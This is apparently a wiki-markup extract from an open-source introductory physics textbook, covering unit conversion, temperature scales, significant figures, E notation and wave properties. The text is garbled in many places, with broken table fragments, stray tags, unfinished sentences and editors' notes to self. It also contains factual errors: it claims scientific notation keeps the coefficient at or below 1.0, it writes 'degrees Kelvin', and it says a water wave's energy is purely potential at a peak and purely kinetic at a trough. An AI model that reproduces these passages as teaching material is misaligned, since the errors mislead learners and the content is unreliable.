= How to Change Units-- the &quot;Multiply by 1&quot; Technique =

Also known as fractional dimensional analysis, the technique involves multiplying a labeled quantity by a conversion ratio, or knowledge of conversion factors.  First, a relationship between the two units that you wish to convert between must be found. Here's a simple example: converting millimetres (mm) to metres (m)-- the SI unit of length. We know that there are 1000 mm in 1 m which we can write as

&lt;center&gt;&lt;math&gt;\begin{matrix}1000 \mbox{ mm} = 1 \mbox{ m}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Now multiplying both sides by 

&lt;center&gt;&lt;math&gt;\frac{1}{1000 \mbox{ mm}}&lt;/math&gt;&lt;/center&gt;

we get 

&lt;center&gt;&lt;math&gt;\begin{matrix}\frac{1}{1000 mm}1000 mm=\frac{1}{1000 mm}1m,\end{matrix}&lt;/math&gt;&lt;/center&gt;


which simply gives us

&lt;center&gt;&lt;math&gt;\begin{matrix}1=\frac{1m}{1000 mm}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

This is the conversion ratio from millimetres to metres.  You can derive any conversion ratio in this way from a known relationship
between two units. Let's use the conversion ratio we have just derived in an example:


'''Question''': Express 3800 ''mm'' in metres.


'''Answer''':


&lt;center&gt;&lt;math&gt;\begin{matrix}3800 mm &amp; = &amp; 3800 mm \times 1\\&amp; = &amp; 3800 mm \times \frac{1m}{1000 mm}\\&amp; = &amp; 3.8 m\\\end{matrix}&lt;/math&gt;&lt;/center&gt;


Note that we wrote every unit in each step of the calculation. By writing them in and cancelling 
them properly, we can check that we have the right units when we are finished. We started with ''mm'' and multiplied by &lt;math&gt;\frac{m}{mm}&lt;/math&gt;

This cancelled the ''mm'' leaving us with just ''m'', which is the SI unit we wanted! If we wished to do the reverse and convert metres to
millimetres, then we would need a conversion ratio with millimetres on the top and metres on the bottom.


It is helpful to understand that units cancel when one is in the numerator and the other is in the denominator. If the unit you are trying to cancel is on the top, then the conversion factor that you multiply it with must be on the bottom.

This same technique can be used to not just to convert units, but can also be used as a way to solve for an unknown quantity. For example:  If I was driving at 65 miles per hour, then I could find how far I would go in 5 hours by using &lt;math&gt;\frac{65\mbox{ miles}}{1\mbox{ hour}}&lt;/math&gt; as a conversion factor.

This would look like &lt;math&gt;\frac{5\mbox{ hours}}{1}\frac{65\mbox{ miles}}{1\mbox{ hour}}&lt;/math&gt;

This would yield a result of 325 miles because the hours would cancel leaving miles as the only unit.
==Practice Problem==

'''Problem''': Convert 3 millennia into seconds.  

Most people don't know how many seconds are in a millennium, but they do know enough to solve this problem.  Since we know 1000 years = 1 millennium, 1 year = about 365.2425 days, 1 day = 24 hours, and 1 hour = 3600 seconds we can solve this problem by multiplying by one many times.

&lt;math&gt;\frac{3\mbox{ millennia}}{1}\frac{1000\mbox{ years}}{1\mbox{ millennium}}\frac{365.2425\mbox{ days}}{1\mbox{ year}}\frac{24\mbox{ hours}}{1\mbox{ day}}\frac{3600\mbox{ seconds}}{1\mbox{ hour}}&lt;/math&gt;</text>

= How Units Can Help You =

We conclude each section of this book with a discussion of the units most relevant to that particular section. It is important to try to understand what the units mean. That is why thinking about the examples and explanations of the units is essential.

If we are careful with our units then the numbers we get in our calculations can be checked in a 'sanity test'.

== What is a 'sanity test'? ==

This isn't a special or secret test. All we do is stop, take a deep breath, and look at our answer. Sure we always look at our answers-- or do we? This time we mean stop and really look-- does our answer make sense?

Imagine you were calculating the number of people in a classroom. If the answer you got was 1 000 000 people you  would know it was wrong&amp;mdash;that's just an insane number of people to have in a classroom. That's all a sanity check is&amp;mdash;is your answer insane or not? But what units were we using? We
were using people as our unit. This helped us to make sense of the answer. If we had used some other unit (or no unit) the number would have
lacked meaning and a sanity test would have been much harder (or even impossible).

It is useful to have an idea of some numbers before we start. For example, let's consider masses. An average person has mass 70 kg,
while the heaviest person in medical history had a mass of 635 kg. If you ever have to calculate a person's mass and you get 7000 kg, this should fail your sanity check&amp;mdash;your answer is insane and you must have made a mistake somewhere. In the same way an answer of 0.00001 kg should fail your sanity test.

The only problem with a sanity check is that you must know what typical values for things are.
In the example of people in a classroom you need to know that there are usually 20-50 people in a classroom. Only then do you know that
your answer of 1 000 000 must be wrong. Here is a table of typical values of various things (big and small, fast and slow, light and heavy&amp;mdash;you get the idea):

= Temperature =
In everyday life, many people measure temperatures in Celsius. But in physics, we prefer to use the Kelvin scale which starts at '''absolute zero'''(−273.15 &amp;deg;C).

As we all know, Celsius temperatures can be negative. This might suggest that
any number is a valid temperature. In fact, the temperature of a gas is a measure of the average kinetic
energy of the particles that make up the gas. As we lower the temperature so the motion of the particles is reduced until a point is
reached where all motion ceases. The temperature at which this occurs is called absolute zero. There is no physically possible temperature
colder than this. In Celsius, absolute zero is at -273.15 &amp;deg;C. In Kelvin, the ordinary freezing point of water 0&amp;deg;C is therefore 273.15 &amp;deg;K

Physicists have defined a new temperature scale called the '''Kelvin scale'''. According to this scale absolute zero is at 0 K and negative temperatures are not allowed. The size of one unit kelvin is exactly the same as that of one unit degree Celsius. This means that a change in temperature of 1 kelvin is equal to a change in temperature of 1 degree Celsius&amp;mdash;the scales just start in different places. Think of two ladders with steps that are the same size but the bottom most step on the Celsius ladder is labelled -273, while the first step on the Kelvin ladder is labelled 0. There are still 100 'steps' or degrees (Celsius or Kelvin) between the points where water freezes and boils when it is at at 1.0 atmosphere of pressure (water boils at lower temperatures if the air pressure is lowerO. 

&lt;!--
MBR Wrote - Don't you need to define what pressure the water is at?. i.e. I can change the boiling point of water by changing its pressure! For me it is important to note that water does not always boil at 100Deg C. I know you are interested in units but your example also needs to be clearly defined.

(NOTE TO SELF: Come up with a decent picture of two ladders with the labels --water boiling and freezing--in the same place but with different labelling on the steps!)

This makes the conversion from kelvin to degree Celsius and back very easy. To convert from degrees Celsius to kelvins add 273. To convert from kelvins to degrees Celsius subtract 273. Representing the Kelvin temperature by ''T''&lt;sub&gt;K&lt;/sub&gt; and the Celsius temperature by ''T''&lt;sub&gt;&amp;deg;C&lt;/sub&gt;,

&lt;center&gt;&lt;math&gt;\begin{matrix}T_K &amp;=&amp; T_{oC} + 273\end{matrix}&lt;/math&gt;&lt;/center&gt;
&lt;center&gt;or&lt;/center&gt;
&lt;center&gt;&lt;math&gt;\begin{matrix}T_{oC} &amp;=&amp; T_K - 273\end{matrix}&lt;/math&gt;&lt;/center&gt;

Converting between kelvin and Celsius is additive -- so a difference in temperature of 1 degree Celsius is equal to a difference of 1 kelvin. The majority of conversions between units are multiplicative. For example, to convert from metres to millimetres we '''multiply''' by 1000. Therefore a change of 1 m is equal to a change of 1000 mm.

Although it seems as though there is not much reason for the scientific community to use the Kelvin scale over the Celsius scale, there is actually a very remarkable difference in using the Kelvin scale other than the reminding effect stated above. It happens that the idealised form of some materials varies proportionately according to the Kelvin scale, such that some required values can be simply found by multiplication and division. In such calculations, it is just a chore to use the Celsius scale.


===Fahrenheit Scale ===
Fahrenheit is a temperature scale previously used in meteorology until about 1970, and which is still widely used in the USA. It was devised by a German physicist in 1724. He needed a scale that went below the freezing point of water, and used a mixture of ice, water, and ammonium chloride which freezes at a much lower temperature. 

In this scale, the freezing point of water (0&amp;deg;C) is 32 degrees Fahrenheit (32°F) and the boiling point (100&amp;deg;C) is 212 °F, placing the boiling and freezing points of water exactly 180 degrees apart. A temperature interval of one degree Fahrenheit is an interval of 5⁄9 of a degree Celsius. The Fahrenheit and Celsius scales coincide at −40 degrees (i.e. −40 °F and −40 °C describe the same temperature).

To convert Celsius to Fahrenheit:

1) Take your number in Celsius and multiply by 9.

2) Divide the result of step 1 by 5.

3) Add 32 to the result of step 2.



Converting Fahrenheit to Celsius:

1) Take your number in Fahrenheit and subtract 32

2) Multiply the result of step 1 by 5.

3) Divide the result of step 2 by 9.

===Rankine Scale ===
Absolute zero is −459.67 °F. The Rankine temperature scale was created to use degrees the same size as those of the Fahrenheit scale, such that a temperature difference of one degree Rankine (1 °R) is the same as a temperature difference of 1 °F, but with absolute zero being 0 °R.</text>

= Scientific Notation, Significant Figures and Rounding =

If you are only sure of say, both digits of a two-digit number, and put it in a formula and get a long series of numbers to the right of the decimal place, then those digits are probably not very accurate. This is the idea of significant figures.

Take 10 and divide by 3. If you are not sure that the number 10 is perfectly accurate, then you do not need to write down 3.333... and can get away with  something like 3.3 or 3.33

(NOTE TO SELF: still to be written)

The accuracy of a measurement using significant figures is represented by the number of digits that it contains. A number is said to have the number of significant figures equal to the number of digits in the number not including leading 0s or trailing 0s unless there is a decimal point. The table below contains a list of numbers and how many significant digits each contains.

| align=&quot;CENTER&quot; | 3
|}

As you may have noted, some numbers cannot be shown in proper significant figure notation without the use of scientific notation. For example, the number 1000 can only be shown to have 1 or 4 or more significant digits by the inclusion of a decimal point. However, by rewriting 1000 as &lt;math&gt;1.\times {10^3} &lt;/math&gt; any number of significant digits may be added by simply add additional 0s after the decimal point.

Sometimes you may be asked to determine the number of significant figures in a given number. There are three rules to determine what numerals are significant.

# '''Leading zeros''' are never significant. Leading zeros are zeros that appear on the left end of the number.
# '''All non-zero digits''' are significant. '''Trapped zeros''' (zeros between non-zero digits) are also significant.
# '''Trailing zeros''' are never significant ''unless'' there is a decimal point. Trailing zeros are zeros that appear on the right end of the number.

=== '''E''' notation ===

Very large numbers such as the speed of light (the C part of Einstein's famous  &lt;math&gt;E=MC^2 &lt;/math&gt;) are difficult to write accurately.

We could write 300,000,000 m/sec, &lt;math&gt;3x10^8&lt;/math&gt;, 300 million meters per second or some such. There is a much better way! 

We simply separate the number (coefficient)  part '''3''' from its multiplier '''00000000''' base!

But be careful, there is an '''E'''lephant trap here, and it is that in scientific notation the number is always expressed as a '''decimal fraction  with a maximum value of 1.0''', (in this case =0.3) so the multiplier part is one bigger than you might expect!  &lt;math&gt; 3x10^8&lt;/math&gt; is the same as 0.3E9. (Because there are a total of nine digits after the decimal point)

A tiny dust particle might weigh as little as 0.000 000 000 678 kg.! This time we shift the decimal point 9 places to the right so the number (678) has a '''negative''' base so our weight is written as 0.678E'''-'''9 kg. 

Now is that not a whole lot easier to write and understand? That is why many scientific calculators and most spread-sheets allow input and display in '''E notation''' format.

=== Commas and points ===
Most English speaking people use the comma [''' , '''] to separate thousands and the dot (ful-stop, or point) [''' . '''] for the decimal indicator. Europeans often use these the other way around. Many spread-sheets allow both, but it is just one more complexity you need to know about!</text>

= Conclusion =
In this chapter we have discussed the importance of units. We have discovered that there are many 
different units to describe the same thing, although you should stick to SI units in your
calculations. We have also discussed how to convert between different units. This is a skill you must acquire.</text>

== Waves and Wavelike Motion ==
Waves occur frequently in nature. The most obvious examples are waves in water on a dam, in the ocean, or in a bucket, but sound waves and electromagnetic waves are other, less visible examples. We are
most interested in the properties that waves have. All waves have the same basic properties, so by studying waves in water we can transfer our knowledge and predict how other types of waves will behave.

Waves are associated with energy. As the waves move, they carry energy from one point to another in space. It is true for water waves as well. You can see the wave energy working while a ship drifts along the wave in rough sea. The most spectacular example is the enormous amount of energy we receive from the sun in the form of light and heat, which are transmitted as electromagnetic waves - not even requiring a medium to propagate.

== Simple Harmonic Motion ==
Simple Harmonic motion is a wavelike motion.  It is considered wavelike because the graph of time vs. displacement from the equilibrium position is a sine curve.

An example of simple harmonic motion is a mass oscillating on a spring.  It will be hard to understand  the forces involved this early in the course that cause the motion to simple harmonic, but it is still possible to look at a mass oscillating on a spring and understand that it is indeed simple harmonic. When a mass is oscillating on a spring, the further the string stretches, the slower the mass will be moving.  Then the mass reaches a point where the string won't stretch any further, so it quits moving and then it reverses direction.  As it moves closer to the equilibrium position is moves faster.</text>

= What are waves? =
Waves are phenomena that everyone experiences constantly; water waves, sound waves, light waves, human waves when the home team scores... the list goes on.  When asked what makes a wave a wave, the most common responses would probably be that a wave is something that moves, or propagates, or perhaps that it is something that repeats over and over again.  These properties do capture the essential qualities of waves.  Now we must determine these properties quantitatively, and discover what governs their behavior.

Generally, a wave is defined as any phenomenon which can be modeled by a function of the form &lt;math&gt;f(\overline{k} \overline{r} - \omega t)&lt;/math&gt; where the r-vector represents a position in space, and t represents a time, and the k-vector and omega are both constants.  Don't be intimidated by the vectors in the argument - most of our time at first will be spent on one-dimensional waves.  If the wave is in only one spatial dimension 'x', for instance a wave travelling on a taut string, it can be written simply as  &lt;big&gt;&lt;math&gt;f(k x - w t)&lt;/math&gt;&lt;/big&gt;.

Any function of this form &quot;propagates&quot; along the &lt;math&gt;\overline{k}&lt;/math&gt; direction over time.  As time increases, the argument of the function increases; over time the form of the function effectively advances through space.  Try coming up with functions of this form, and plot them at time t = 0, then plot them again at a later time.  This progressive property will become obvious.  Try to figure out the velocity with which your function advances!  (we will study this later)  The negative sign in front of the time term causes the wave to propagate in the direction defined as positive (if that seems confusing, try plotting more functions over time, and examine the results).  If you replace the negative with a positive (or instead consider a negative value of omega), the wave will propagate in the negative direction.

A very special and important case of a wave is the mathematical function &lt;math&gt;f(\overline{k} \overline{r} - \omega t) = sin(\overline{k} \overline{r} - \omega t) &lt;/math&gt;, or in one dimension, &lt;big&gt;&lt;math&gt;f(k x - \omega t) = sin(k x - \omega t) &lt;/math&gt;&lt;/big&gt;.  This is a sinusoidal wave - it oscillates up and down infinitely in both directions, and moves as time progresses.  I mentioned that waves have the quality of repeating over and over, the quality of '''periodicity'''.  However, many functions of the form mentioned above do not seem to repeat.  However, you will find that ALL waves can be decomposed into a sum of many of these simple, infinitely repeating waves when you learn about Fourier transformations.

More than any other concept, physicists are finding that '''waves''' characterize the structure of the universe at every scale imaginable.  As you learn about the physics of waves in everyday life, keep an open mind towards finding waves and wave behavior everywhere you turn.

Let's consider a very well-known case of a wave phenomenon: water waves. Waves in water consist of moving peaks and troughs. A peak is a place where the
water rises higher than when the water is still and a trough is a place where the water sinks lower than when the water is still.

So waves have peaks and troughs. This could be our first property for waves. The following diagram shows the peaks and troughs on a wave.

[[Image:fhsst_waves1.png|472px]]

In physics we try to be as quantitative as possible. If we look very carefully we notice that the height of the peaks above the
level of the still water is the same as the depth of the troughs below the level of the still water.

Waves are repetitions of physical quantity in a periodic manner, carrying energy in the process. The water waves, for example, can be visualized to repeat any of the physical quantities like &quot;peaks&quot;, &quot;troughs&quot;, &quot;potential energy&quot; or &quot;kinetic energy&quot;. Even, we can visualize water waves as the motion of disturbance (energy). It is the energy aspect of waves that is central to the understanding of different types of waves, many of which are not visible.

Looking closely at the water wave, we can recognize that crests and troughs basically  represent of extreme potential and kinetic energies in addition to representing rise and fall of water from the still level. At the peak, energy is only potential, whereas energy is only kinetic at the trough. Similarly, propagation of electromagnetic wave is associated with repetitions of magnetic and electric field in space with certain periodicity. As existence of electrical or magnetic fields does not require any medium, electromagnetic waves can move even in the absence of any medium.    

== Characteristics of Waves : Amplitude ==

We use symbols agreed upon by convention to label the characteristic quantities of the waves. The characteristic height
of a peak and depth of a trough is called the amplitude of the wave. The vertical distance between the bottom of the trough and
the top of the peak is twice the amplitude. To put it simply, the amplitude is the distance of the wave from the medium, to the crest or trough 

[[Image:fhsst_waves2.png|463px|]]

Worked Example 1

'''Question:''' (NOTE TO SELF: Make this a more exciting question)
The height of the wave from the medium is 2m. What is the distance from the peak to the trough. What

'''Answer:'''

The amplitude is 2m. (Read above paragraph to know why). The distance from the peak to trough is 4m.

== Characteristics of Waves : Wavelength ==
Look a little closer at the peaks and the troughs. The distance between two adjacent (next to each other) peaks is the same
no matter which two adjacent peaks you choose. So there is a fixed distance between the peaks.

Similarly, you'll notice that the distance between two adjacent troughs is the same no matter which two troughs you look
at. But, more importantly, its is the same as the distance between the peaks. This distance which is a characteristic of the
wave is called the wavelength. 

Waves have a characteristic wavelength. The symbol for the wavelength
is the Greek letter lambda, &lt;math&gt;\lambda&lt;/math&gt;.

[[Image:fhsst_waves3.png|472px|]]

The wavelength is the distance between any two adjacent points which are in phase. Two points in phase are separate by an
integer (0,1,2,3,...) number of complete wave cycles. They don't have to be peaks or trough but they must be separated by a
complete number of waves.

== Characteristics of Waves : Period ==
Now imagine you are sitting next to a pond and you watch the waves going past you. First one peak, then a trough and then another
peak. If you measure the time between two adjacent peaks you'll find that it is the same. Now if you measure the time between two
adjacent troughs you'll find that its always the same, no matter which two adjacent troughs you pick. The time you have been
measuring is the time for one wavelength to pass by. We call this time the period and it is a characteristic of the wave.

The period of the wave is denoted with the symbol &lt;math&gt;T&lt;/math&gt;.

== Characteristics of Waves : Frequency ==
There is another way of characterising the time interval of a wave. We timed how long it takes for one wavelength to go past. We could also 
turn this around and say how many waves go by in 1 second. 

We can easily determine this number, which we call the frequency and denote f. To determine the frequency, how many waves go by in
1s, we work out what fraction of a waves goes by in 1 second by dividing 1 second by the time it takes T. If a wave takes 1/2 a
second to go by then in 1 second two waves must go by. &lt;math&gt;\frac{1}{\frac{1}{2}} =2&lt;/math&gt;. The unit of frequency is the ''Hz'' or ''s''&lt;sup&gt;-1&lt;/sup&gt;.

Waves have a characteristic frequency.

|  colspan=&quot;2&quot; | &lt;math&gt;f=\frac{1}{T}&lt;/math&gt;
{| 
|- 
| align=&quot;RIGHT&quot; | &amp;nbsp;

|- 
| align=&quot;RIGHT&quot; | ''f''

|- 
| align=&quot;RIGHT&quot; | ''T''
| align=&quot;LEFT&quot; | : period (''s'')
|}

generally, the frequency of a wave is the number of crests that pass by per unit time.

== Characteristics of Waves : Speed ==

Now if you are watching a wave go by you will notice that they move at a constant velocity. Thinking back to rectilinear motion
you will be able to remember that we know how to work out how fast something moves. The speed is the distance you travel divided by
the time you take to travel that distance. This is excellent because we know that the waves travel a distance &lt;math&gt;\lambda&lt;/math&gt; in a 
time T. This means that we can determine the speed.

| align=&quot;LEFT&quot; | : speed (''m''.''s''&lt;sup&gt;-1&lt;/sup&gt;)
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\lambda&lt;/math&gt;
| align=&quot;LEFT&quot; | : wavelength (''m'')
|- 
| align=&quot;RIGHT&quot; | ''T''
| align=&quot;LEFT&quot; | : period (''s'')
|}

There are a number of relationships involving the various characteristic quantities of waves. A simple example of how this
would be useful is how to determine the velocity when you have the frequency and the wavelength. We can take the above equation and
substitute the relationship between frequency and period to produce an equation for speed of the form

{| cellpadding=&quot;3&quot;
|- 
| colspan=&quot;2&quot; | &lt;math&gt;v = f\lambda&lt;/math&gt;
{| 
|- 
| align=&quot;RIGHT&quot; | &amp;nbsp;
| align=&quot;LEFT&quot; | &amp;nbsp;
|- 
| align=&quot;RIGHT&quot; | ''v''
| align=&quot;LEFT&quot; | : speed (''m''.''s''&lt;sup&gt;-1&lt;/sup&gt;)
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\lambda&lt;/math&gt;
| align=&quot;LEFT&quot; | : wavelength (''m'')
|- 
| align=&quot;RIGHT&quot; | ''f''
| align=&quot;LEFT&quot; | : frequency (''Hz'' or ''s''&lt;sup&gt;-1&lt;/sup&gt;)
|}

Is this correct? Remember a simple first check is to check the units! On the right hand side we have speed which has units
''ms''&lt;sup&gt;-1&lt;/sup&gt;. On the left hand side we have frequency which is measured in ''s''&lt;sup&gt;-1&lt;/sup&gt; multiplied by wavelength which is measure in
''m''. On the left hand side we have ''ms''&lt;sup&gt;-1&lt;/sup&gt; which is exactly what we want.

=== Speed of a wave through strings ===
The speed of a wave traveling along a vibrating string (v) is directly proportional to the square root of the tension (''T'') over the linear density (μ):

:&lt;math&gt;
v=\sqrt{\frac{T}{\mu}} \,
&lt;/math&gt;

μ is equal to the mass of the string divided by the length of the string.

&lt;math&gt;
\mu={\frac{M}{L}}
&lt;/math&gt;</text>

= Two Types of Waves = 

We agreed that a wave was a moving set of peaks and troughs and we used water as an example. Moving peaks and troughs, with all the
characteristics we described, in any medium constitute a wave. It is possible to have waves where the peaks and troughs are
perpendicular to the direction of motion, like in the case of water waves. These waves are called transverse waves.

There are two additional types of waves. The first is called longitudinal waves and have the peaks and troughs in the same direction as the
wave is moving. The question is how do we construct such a wave?

An example of a longitudinal wave is pressure waves moving through a gas. The peaks in this wave are places where the pressure
reaches a peak and the troughs are places where the pressure is a minimum.


In the picture below we show the random placement of the gas molecules in a tube. The piston at the end moves into the tube
with a repetitive motion. Before the first piston stroke the pressure is the same throughout the tube.

[[Image:fhsst_waves4.png|236px|]]

When the piston moves in it compresses the gas molecules together at the end of the tube. If the piston stopped moving the gas
molecules would all bang into each other and the pressure would increase in the tube.

[[Image:fhsst_waves5.png|236px|]]

When the piston moves out again before the molecules have time to bang around then the increase in pressure moves down the tube like
a pulse (single peak and trough, a single wave cycle).

[[Image:fhsst_waves6.png|236px|]]

As this repeats we get waves of increased and decreased pressure moving down the tubes. We can describe these pulses of increased
pressure (peaks in the pressure) and decreased pressure (troughs of pressure) by a sine or cosine graph.

[[Image:fhsst_waves7.png|236px|]]


[[Image:fhsst_waves8.png|236px|]]

The second additional type of wave is the torsional wave. The peaks and troughs rotate around the direction of motion. In simpler terms, a &quot;twisting motion&quot; is transmitted through the medium. Of the two wave types, this is the hardest one to describe and visualize.

There are a number of examples of each type of wave. Not all can be seen with the naked eye but all can be detected.</text>

= Properties of Waves =

We have discussed some of the simple properties of waves that we need
to know. These have just been describing the characteristics that
waves have. Now we can progress onto some more interesting and,
perhaps, less intuitive properties of waves.

== Properties of Waves : Reflection ==

When waves strike a barrier they are reflected. This means that waves
bounce off things. Sound waves bounce off walls, light waves bounce
off mirrors, radar waves bounce off planes and how bats can fly at
night and avoid things as small as telephone wires. etc. The property
of reflection is a very important and useful one.

(NOTE TO SELF: Get an essay by an air traffic controller on radar)
(NOTE TO SELF: Get an essay by on sonar usage for fishing or for submarines)

When waves are reflected, the process of reflection has certain
properties. If a wave hits an obstacle at a right angle to the surface
(NOTE TO SELF: diagrams needed) then the wave is reflected directly
backwards.

[[Image:fhsst waves9.png|372px|]]

[[Image:fhsst waves10.png|372px|]]

If the wave strikes the obstacle at some other angle then it is
not reflected directly backwards. The angle that the waves arrives
at is the same as the angle that the reflected waves leaves at.
The angle that waves arrives at or is incident at equals the angle
the waves leaves at or is reflected at. Angle of incidence equals
angle of reflection

&lt;/blockquote&gt;

[[Image:fhsst waves11.png|372px|]]

In the optics chapter you will learn that light is a wave. This means
that all the properties we have just learnt apply to light as well. Its
very easy to demonstrate reflection of light with a mirror. You can also
easily show that angle of incidence equals angle of reflection.

If you look directly into you see yourself ....

'''Need to mention that the incident wave, normal to the surface and the reflected wave all lie in the same plane. The same also holds for refraction at a surface.'''

=== Phase shift of reflected wave ===

When a wave is reflected from a more dense medium, it undergoes a phase
shift. That means that the peaks and troughs are swapped around.

The easiest way to demonstrate this is to tie a piece of string to
something. Stretch the string out flat and then flick the string
once so a pulse moves down the string. When the pulse (a single peak
in a wave) hits the barrier that the string is tied to, it will be
reflected. The reflected wave will look like a trough instead of a
peak. This is because the pulse had undergone a phase change. The
fixed end is like reflection off a more dense medium.

[[Image:fhsst waves12.png|236px|]]

[[Image:fhsst waves13.png|236px]]

[[Image:fhsst waves14.png|236px|]]

If the end of the string was not fixed, i.e. it could move up and
down then the wave would still be reflected but it would 
not undergo a phase shift.

[[Image:fhsst waves17.png|236px|]]

== Properties of Waves : Refraction ==

Sometimes waves move from one medium to another. The medium is the
substance that is carrying the waves. In our first example this was
the water. When the medium properties change it can affect the wave.

Let us start with the simple case of a water wave moving from one
depth to another.
The speed of the wave depends on the depth. If the wave moves directly
from the one medium to the other than we should look closely at the
boundary. When a peak arrives at the boundary and moves across it must
remain a peak on the other side of the boundary. This means that the
peaks pass by at the same time intervals on either side of the
boundary. The period and frequency remain the same! But we said the
speed of the wave changes, which means that the distance it travels in
one time interval is different i.e. the wavelength has changed.

Going from one medium to another the period or frequency does not
change only the wavelength can change.

Now if we consider a water wave moving at an angle of incidence not 90
degrees towards a change in medium then we immediately know that not
the whole wave will arrive at once. So if a part of the wave arrives
and slows down while the rest is still moving faster before it arrives
the angle of the wavefront is going to change. This is known as
refraction. When a wave bends or changes its direction when it goes
from one medium to the next.

If it slows down it turns towards the perpendicular.

[[Image:fhsst waves18.png|372px|]]

If the wave speeds up in the new medium it turns away from the
perpendicular to the medium surface.

When you look at a stick that emerges from water it looks like it
is bent. This is because the light from below the surface of the
water bends when it leaves the water. Your eyes project the light
back in a straight line and so the object looks like it is a
different place.

[[Image:fhsst waves19.png|372px|]]

== Properties of Waves : Interference ==

If two waves meet interesting things can happen. Waves are basically
collective motion of particles. So when two waves meet they both try
to impose their collective motion on the particles. This can have
quite different results.

If two identical (same wavelength, amplitude and frequency) waves are
both trying to form a peak then they are able to achieve the sum of
their efforts. The resulting motion will be a peak which has a height
which is the sum of the heights of the two waves. If two waves are
both trying to form a trough in the same place then a deeper trough is
formed, the depth of which is the sum of the depths of the two
waves. Now in this case the two waves have been trying to do the same
thing and so add together constructively. This is called
constructive interference.

[[Image:fhsst waves20.png|761px|]]

[[Image:fhsst waves21.png|761px|]]

[[Image:fhsst waves22.png|761px|]]

If one wave is trying to form a peak and the other is trying to
form a trough then they are competing to do different things. In
this case they can cancel out. The height of the peak less the
depth of the trough will be the resulting effect. If the depth of
the trough is the same as the height of the peak nothing will
happen. If the height of the peak is bigger than the depth of the
trough a smaller peak will appear and if the trough is deeper then
a less deep trough will appear. This is destructive
interference.

[[Image:fhsst waves23.png|761px|]]

[[Image:fhsst waves24.png|761px|]]

[[Image:fhsst waves25.png|761px|]]

== Properties of Waves : Standing Waves ==

When two waves move in opposite directions, through each other,
constructive interference happens. If the two waves have the same
frequency and wavelength then a specific type of constructive
interference can occur: standing waves can form.

Standing waves are disturbances which don't appear to move, they
stand in the same place. Lets demonstrate exactly how this comes
about. Imagine a long string with waves being sent down it from
either end. The waves from both ends have the same amplitude,
wavelength and frequency as you can see in the picture below:

[[Image:fhsst waves26.png|460px|]]

To stop from getting confused between the two waves we'll draw the
wave from the left with a dashed line and the one from the right
with a solid line. As the waves move closer together when they touch
both waves have an amplitude of zero:

[[Image:fhsst waves27.png|460px|]]

If we wait for a short time the ends of the two waves move past each
other and the waves overlap. Now we know what happens when two waves
overlap, we add them together to get the resulting wave.

[[Image:fhsst waves28.png|460px|]]

Now we know what happens when two waves overlap, we add them
together to get the resulting wave. In this picture we show the two
waves as dotted lines and the sum of the two in the overlap region
is shown as a solid line:

[[Image:fhsst waves29.png|460px|]]

The important thing to note in this case is that there are some
points where the two waves always destructively interfere to zero.
If we let the two waves move a little further we get the picture
below:

[[Image:fhsst waves30.png|460px|]]

Again we have to add the two waves together in the overlap region to
see what the sum of the waves looks like.

[[Image:fhsst waves31.png|460px|]]

In this case the two waves have moved half a cycle past each other
but because they are out of phase they cancel out completely. The
point at 0 will always be zero as the two waves move past each
other.

When the waves have moved past each other so that they are
overlapping for a large region the situation looks like a wave
oscillating in place. If we focus on the range -4, 4 once the waves
have moved over the whole region. To make it clearer the arrows at
the top of the picture show peaks where maximum positive
constructive interference is taking place. The arrows at the bottom
of the picture show places where maximum negative interference is
taking place.

[[Image:fhsst waves32.png|369px|]]

As time goes by the peaks become smaller and the troughs become
shallower but they do not move.

[[Image:fhsst waves33.png|369px|]]

For an instant the entire region will look completely flat.

[[Image:fhsst waves34.png|369px|]]

The various points continue their motion in the same manner.

[[Image:fhsst waves35.png|369px|]]

Eventually the picture looks like the complete reflection through
the x-axis of what we started with:

[[Image:fhsst waves36.png|369px|]]

Then all the points begin to move back. Each point on the line is
oscillating up and down with a different amplitude.

[[Image:fhsst waves37.png|369px|]]

If we superimpose the two cases where the peaks where at a maximum
and the case where the same waves where at a minimum we can see the
lines that the points oscillate between. We call this the envelope
of the standing wave as it contains all the oscillations of the
individual points. A node is a place where the two waves cancel out
completely as two waves destructively interfere in the same place.
An anti-node is a place where the two waves constructively
interfere.

[[Image:fhsst waves38.png|453px|]]

To make the concept of the envelope clearer let us draw arrows
describing the motion of points along the line.

[[Image:fhsst waves39.png|453px|]]

Every point in the medium containing a standing wave oscillates up
and down and the amplitude of the oscillations depends on the
location of the point. It is convenient to draw the envelope for the
oscillations to describe the motion. We cannot draw the up and down
arrows for every single point!

=== Reflection from a fixed end ===

If waves are reflected from a fixed end, for example tying the end
of a rope to a pole and then sending waves down it. The fixed end
will always be a node. Remember: Waves reflected from a
fixed end undergo a phase shift.

The wavelength, amplitude and speed of the wave cannot affect this,
the fixed end is always a node.

=== Reflection from an open end ===

If waves are reflected from end, which is free to move, it is an
anti-node. For example tying the end of a rope to a ring, which can
move up and down, around the pole. Remember: The waves sent
down the string are reflected but do not suffer a phase shift.

== Beats ==

If the waves that are interfering are not identical then the waves
form a modulated pattern with a changing amplitude. The peaks in
amplitude are called beats. If you consider two sound waves
interfering then you hear sudden beats in loudness or intensity of
the sound.

The simplest illustration is to draw two different waves and then
add them together. You can do this mathematically and draw them
yourself to see the pattern that occurs.

Here is wave 1:

[[Image:fhsst waves42.png|761px|]]

Now we add this to another wave, wave 2:

[[Image:fhsst waves43.png|761px|]]

When the two waves are added (drawn in coloured dashed lines) you
can see the resulting wave pattern:

[[Image:fhsst waves44.png|761px|]]

To make things clearer the resulting wave without the dashed lines
is drawn below. Notice that the peaks are the same distance apart
but the amplitude changes. If you look at the peaks they are
modulated i.e. the peak amplitudes seem to oscillate with another
wave pattern. This is what we mean by modulation.

[[Image:fhsst waves45.png|761px|]]

The maximum amplitude that the new wave gets to is the sum of the
two waves just like for constructive interference. Where the waves
reach a maximum it is constructive interference.

The smallest amplitude is just the difference between the
amplitudes of the two waves, exactly like in destructive
interference.

The beats have a frequency which is the difference between the
frequency of the two waves that were added. This means that the
beat frequency is given by

|&lt;center&gt;&lt;math&gt;f_B=|f_1-f_2|&lt;/math&gt;&lt;/center&gt;

|-

| align=&quot;LEFT&quot; | : frequency of wave 1 (Hz or s&lt;sup&gt;-1&lt;/sup&gt;)
|- 
| align=&quot;RIGHT&quot; | ''f''&lt;sub&gt;2&lt;/sub&gt;
